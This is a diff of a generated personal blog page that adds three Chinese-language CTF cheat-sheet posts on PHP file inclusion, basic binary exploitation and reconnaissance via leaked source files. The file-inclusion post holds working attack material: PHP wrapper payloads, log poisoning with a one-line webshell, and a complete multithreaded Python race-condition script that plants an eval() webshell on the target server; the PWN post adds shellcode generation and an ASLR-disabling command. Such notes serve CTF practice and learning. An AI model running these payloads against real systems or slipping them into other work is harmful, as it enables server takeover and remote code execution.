@@ -124,12 +124,12 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -150,6 +150,272 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://jasmineaura.github.io/2024/07/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="JasmineAura">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JasmineAura's Blog">
+      <meta itemprop="description" content="It's just a matter of time">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | JasmineAura's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/07/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-07-29 16:07:54 / 修改时间：16:10:24" itemprop="dateCreated datePublished" datetime="2024-07-29T16:07:54+08:00">2024-07-29</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h5 id="php-filter-协议"><a href="#php-filter-协议" class="headerlink" title="php://filter 协议"></a><code>php://filter</code> 协议</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx</span><br></pre></td></tr></table></figure>
+<p>妙用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*]php://filter可以绕过 exit; die();</span><br><span class="line">[*]传入的指令需要提前rot13处理，然后filter进行rot13，这样传入的指令不受影响，而exit或die都被修改掉了.</span><br><span class="line"></span><br><span class="line">[!]php://filter/write=string.rot13/resource=a.php</span><br><span class="line">[!]POST请求中填入指令</span><br><span class="line"></span><br><span class="line">[+]也可以使用php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br><span class="line">[#]UCS-2对字符串每2位反转一次.</span><br></pre></td></tr></table></figure>
+
+<p>UCS-2编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;command&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h5 id="data-text-协议"><a href="#data-text-协议" class="headerlink" title="data://text 协议"></a><code>data://text</code> 协议</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">被包含时，可以直接执行指令，如果怕过滤，可以提前Base64编码.</span><br><span class="line">[*]data://text/plain;指令</span><br><span class="line">[$]data://text/plain;base64,base64加密的指令</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="php-input-协议"><a href="#php-input-协议" class="headerlink" title="php://input 协议"></a><code>php://input</code> 协议</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?xxx=php://input</span><br><span class="line"></span><br><span class="line">[+]在POST请求中填入需要input的内容</span><br></pre></td></tr></table></figure>
+
+<h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">日志文件路径: /var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">[1]在User-Agent中写入一句话木马（不要用双引号）</span><br><span class="line">[2]在POST请求中进行RCE，url?file=/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">[!]蚁剑可能无法连接（尽量不要使用）（可以在蚁剑设置里面忽略http证书）</span><br></pre></td></tr></table></figure>
+
+<h3 id="Session条件竞争包含"><a href="#Session条件竞争包含" class="headerlink" title="Session条件竞争包含"></a>Session条件竞争包含</h3><p>原理：<br>php中的session.upload_progress和session.upload_progress.cleanup默认开启，可以通过批量在Session中写入一句话木马，并批量包含，从而getshell.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[1]使用upload.html上传文件，用Burp抓包，Cookie中内容修改为PHPSESSID=flag</span><br><span class="line">[2]写入命令</span><br><span class="line">[3]批量包含Session文件，url?file=/tmp/sess_flag</span><br><span class="line"></span><br><span class="line">[!]需要使用upload.html</span><br><span class="line">[!]上传的文件需要&gt;500KB，防止来不及包含</span><br><span class="line">[!]使用upload.html记得将url改为当前题目url</span><br><span class="line"></span><br><span class="line">[*]可以使用超级脚本</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_unset</span>(); </span><br><span class="line"><span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp/*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;        </span><br><span class="line">	<span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);     </span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;&lt;&quot;</span>)&gt;<span class="number">0</span>)&#123;               </span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);           </span><br><span class="line">	&#125;           </span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#出现这种内容，仍然可以使用Session条件竞争包含</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="超级脚本"><a href="#超级脚本" class="headerlink" title="超级脚本"></a>超级脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;题目地址&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/muma.php&#x27;,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;  </span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">post 传递内容可在网站目录下写入一句话木马。</span></span><br><span class="line"><span class="string">根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。</span></span><br><span class="line"><span class="string">sessionid 可控，所以这里即 /tmp/sess_ctfshow。</span></span><br><span class="line"><span class="string">这样一旦访问成功，就说明木马植入了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># /tmp/sess_sessionid 中写入一句话木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):  </span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url,</span><br><span class="line">			data=&#123;</span><br><span class="line">			<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">			&#125;,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			files=&#123;</span><br><span class="line">			<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">			&#125;,</span><br><span class="line">			verify = <span class="literal">False</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,</span><br><span class="line">	        data=data,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			verify = <span class="literal">False</span></span><br><span class="line">			)</span><br><span class="line">		<span class="comment"># 访问木马文件，如果访问到了就代表竞争成功</span></span><br><span class="line">		resposne2=session.get(url+<span class="string">&#x27;muma.php&#x27;</span>,verify = <span class="literal">False</span>)</span><br><span class="line">		<span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="comment"># 写入和访问分别设置 5 个线程。</span></span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"> </span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://jasmineaura.github.io/2024/07/29/PWN%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="JasmineAura">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JasmineAura's Blog">
+      <meta itemprop="description" content="It's just a matter of time">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | JasmineAura's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/07/29/PWN%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">PWN基础</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-07-29 16:07:35 / 修改时间：16:08:38" itemprop="dateCreated datePublished" datetime="2024-07-29T16:07:35+08:00">2024-07-29</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="GCC编译"><a href="#GCC编译" class="headerlink" title="GCC编译"></a>GCC编译</h3><p><code>gcc 文件</code><br>文件的后缀名为”.c”.</p>
+<h3 id="运行二进制文件"><a href="#运行二进制文件" class="headerlink" title="运行二进制文件"></a>运行二进制文件</h3><p><code>./文件</code></p>
+<h3 id="编译汇编程序-asm-为可执行文件"><a href="#编译汇编程序-asm-为可执行文件" class="headerlink" title="编译汇编程序(.asm)为可执行文件"></a>编译汇编程序(<code>.asm</code>)为可执行文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf example.asm -o example.o</span><br><span class="line">ld -m elf_i386 example.o -o example</span><br></pre></td></tr></table></figure>
+<p>编译后，example即为可执行文件.</p>
+<h3 id="编译汇编语言源文件-s-为可执行文件"><a href="#编译汇编语言源文件-s-为可执行文件" class="headerlink" title="编译汇编语言源文件(.s)为可执行文件"></a>编译汇编语言源文件(<code>.s</code>)为可执行文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o example example.s</span><br></pre></td></tr></table></figure>
+<p>编译后，example即为可执行文件.</p>
+<h3 id="输出流被关闭"><a href="#输出流被关闭" class="headerlink" title="输出流被关闭"></a>输出流被关闭</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec 命令 1&gt;&amp;0</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">exec ls 1&gt;&amp;0</span><br><span class="line">exec cat flag 1&gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<h3 id="got节与-got-plt节"><a href="#got节与-got-plt节" class="headerlink" title=".got节与.got.plt节"></a>.got节与.got.plt节</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*]使用 checksec 文件     //查看文件的RELRO</span><br><span class="line">[-]当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。  </span><br><span class="line">[-]当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。  </span><br><span class="line">[-]当RELRO为No RELRO时，表示.got与.got.plt都可写。</span><br><span class="line"></span><br><span class="line">[*]readelf -S 文件       //查看文件所有节的地址</span><br></pre></td></tr></table></figure>
+
+<h3 id="shellcraft"><a href="#shellcraft" class="headerlink" title="shellcraft"></a>shellcraft</h3><p>NX保护关闭时，可以直接发送shellcode.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.sh()) <span class="comment"># 使用 pwntools 的 shellcraft 模块生成一个 shellcode，并使用 asm 函数将其汇编成二进制指令</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="ASLR相关"><a href="#ASLR相关" class="headerlink" title="ASLR相关"></a>ASLR相关</h3><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全功能，它通过在每次程序运行时随机化内存地址的布局，使得攻击者更难以利用内存地址的固定位置进行攻击.</p>
+<p>可以将该文件的值设置为以下几个选项之一来控制 ASLR 的行为：</p>
+<ul>
+<li>0：关闭 ASLR，内存布局不随机化。</li>
+<li>1：启用 ASLR，但只有堆和栈是随机化的。</li>
+<li>2：启用完整的 ASLR，所有内存段（包括堆、栈、共享库等）都是随机化的。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;0&quot; &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">[!]&quot;0&quot;可换为&quot;1&quot;或&quot;2&quot;</span><br><span class="line">[!]此命令设置的是你当前使用系统的ASLR！</span><br><span class="line"></span><br><span class="line">[*]需要root权限</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fortify相关"><a href="#Fortify相关" class="headerlink" title="Fortify相关"></a>Fortify相关</h3><p>FORTIFY_SOURCE是 Linux 系统中的一个环境变量，用于禁用 Fortify Source 功能，Fortify Source 是 GCC 编译器提供的一种安全增强功能，当 FORTIFY_SOURCE 设置为 0 时，编译器将禁用这一安全功能，不再对代码进行缓冲区溢出检查.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[-]FORTIFY_SOURCE=0：禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。</span><br><span class="line">[-]FORTIFY_SOURCE=1：启用 Fortify 功能的基本级别。 在编译时进行一些安全检查，如缓冲区边界检查、格式化字符串检查等。 在运行时进行某些检查，如检测函数返回值和大小的一致性。 如果检测到潜在的安全问题，会触发运行时错误，并终止程序执行。</span><br><span class="line">[-]FORTIFY_SOURCE=2：启用 Fortify 功能的高级级别。 包括基本级别的安全检查，并添加了更多的检查。 在编译时进行更严格的检查，如更精确的缓冲区边界检查。 提供更丰富的编译器警告和错误信息。</span><br></pre></td></tr></table></figure>
+
+<h3 id="argc"><a href="#argc" class="headerlink" title="argc"></a>argc</h3><p>在 C 语言中，argc 是 main() 函数的参数，用于表示程序运行时命令行参数的数量（argument count）。其中，argc 是一个整数值，表示命令行参数的数量，包括程序名称本身。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://jasmineaura.github.io/2024/07/29/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="JasmineAura">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="JasmineAura's Blog">
+      <meta itemprop="description" content="It's just a matter of time">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | JasmineAura's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/07/29/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="post-title-link" itemprop="url">信息搜集</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-07-29 16:07:25 / 修改时间：16:09:12" itemprop="dateCreated datePublished" datetime="2024-07-29T16:07:25+08:00">2024-07-29</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="index-phps"><a href="#index-phps" class="headerlink" title="index.phps"></a><code>index.phps</code></h3><p>有些题目可以直接访问 <code>/index.phps</code> ，可以下载源码.</p>
+<h3 id="www-zip"><a href="#www-zip" class="headerlink" title="www.zip"></a><code>www.zip</code></h3><p>有些题目可以直接访问 <code>/www.zip</code>，从而下载源码压缩包，找到flag.</p>
+<h3 id="git-index-php"><a href="#git-index-php" class="headerlink" title="/.git/index.php"></a><code>/.git/index.php</code></h3><p>有些题目有版本控制，但部署到了生产环境，从而可以访问 <code>/.git/index.php</code> 来获取源码.</p>
+<h3 id="svn"><a href="#svn" class="headerlink" title="/.svn/"></a><code>/.svn/</code></h3><p>svn泄露,可以直接访问 <code>/.svn/</code> 得到相关信息.</p>
+<h3 id="DS-store"><a href="#DS-store" class="headerlink" title=".DS_store"></a>.DS_store</h3><p>.DS_store泄露.</p>
+<h3 id="vim缓存泄露"><a href="#vim缓存泄露" class="headerlink" title="vim缓存泄露"></a>vim缓存泄露</h3><p>vim在编辑文本时会创建临时文件，如果非正常退出，临时文件就会保留.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以index.php为例</span><br><span class="line">第一次异常退出后，文件名为.index.php.swp</span><br><span class="line">第二次，文件名为.index.php.swo</span><br><span class="line">第三次，文件名为.index.php.swn</span><br><span class="line"><span class="comment">#有时需要去掉.index中的&quot;.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><p>访问 <code>/editor</code> 路径，有时会进入编辑器界面，从而查看所有文件路径.<br>![[Pasted image 20240725092702.png]]</p>
+<h3 id="admin"><a href="#admin" class="headerlink" title="/admin"></a><code>/admin</code></h3><p>一定要试着去访问 <code>/admin</code>，有些题目的flag就会藏在里面.</p>
+<h3 id="php探针"><a href="#php探针" class="headerlink" title="php探针"></a>php探针</h3><p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。<br>有些题目可以访问 <code>/tz.php</code> 来查看探针，有的flag可能会藏在探针中的phpinfo里.</p>
+<h3 id="备份的sql文件泄露"><a href="#备份的sql文件泄露" class="headerlink" title="备份的sql文件泄露"></a>备份的sql文件泄露</h3><p><code>/backup.sql</code> 内可能含有flag.</p>
+<h3 id="mdb文件泄露"><a href="#mdb文件泄露" class="headerlink" title="mdb文件泄露"></a>mdb文件泄露</h3><p>mdb文件是早期asp+access构架的数据库文件，访问 <code>/db/db.mdb</code> 下载文件，flag可能就在其中.</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
